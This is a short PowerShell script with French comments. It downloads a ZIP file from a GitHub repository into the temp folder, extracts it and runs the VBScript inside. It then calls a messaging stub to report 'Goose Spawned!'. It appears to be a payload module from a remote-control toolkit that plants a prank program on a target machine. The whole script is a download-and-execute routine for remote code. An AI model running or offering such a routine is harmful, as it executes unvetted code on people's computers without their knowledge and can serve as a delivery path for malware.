Function Goose {
    $url = "https://github.com/wormserv/assets/raw/main/Goose.zip"
    $tempFolder = $env:TMP
    $zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip"
    $extractPath = Join-Path -Path $tempFolder -ChildPath "Goose"

    # Téléchargement du fichier ZIP
    Try {
        Invoke-WebRequest -Uri $url -OutFile $zipFile
        Write-Host "Fichier ZIP téléchargé avec succès."
    } Catch {
        Write-Host "Erreur lors du téléchargement du fichier ZIP : $_"
        Return
    }

    # Extraction du fichier ZIP
    Try {
        Expand-Archive -Path $zipFile -DestinationPath $extractPath -Force
        Write-Host "Fichier ZIP extrait avec succès."
    } Catch {
        Write-Host "Erreur lors de l'extraction du fichier ZIP : $_"
        Return
    }

    # Vérification et exécution du fichier VBScript
    $vbscript = "$extractPath\Goose.vbs"
    If (Test-Path $vbscript) {
        Write-Host "Exécution du fichier VBScript."
        & $vbscript
        sendMsg -Message ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"
    } Else {
        Write-Host "Erreur : Le fichier VBScript n'a pas été trouvé."
    }
}

Function sendMsg {
    param ($Message)
    Write-Host $Message
}
